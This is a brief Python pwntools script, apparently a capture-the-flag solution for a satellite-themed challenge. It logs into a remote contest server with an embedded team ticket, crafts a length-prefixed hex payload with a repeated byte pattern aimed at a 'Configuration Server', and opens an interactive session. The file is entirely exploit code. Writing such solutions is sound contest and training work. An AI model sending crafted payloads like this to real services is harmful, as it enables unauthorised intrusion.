from pwn import *

ticket = "ticket{echo94467bravo:GCzdv6-jVMzApc92bw6pQsjS2mdLM-gdgCJPuuvdyCQ9ldHpIoyyzM3mi3-0fQDMVw}"

p = remote("sun.satellitesabove.me", 5043)
p.sendlineafter(":", ticket)

p.recvuntil("Configuration Server: Running")

def h(a):
  return hex(a)[2:].rjust(2, "0")

data = "0a000644739e11ba0001" + "030102" * 0x12

payload = h(len(data) / 2 + 1) + data
print(payload)

p.sendline(payload)


p.interactive()
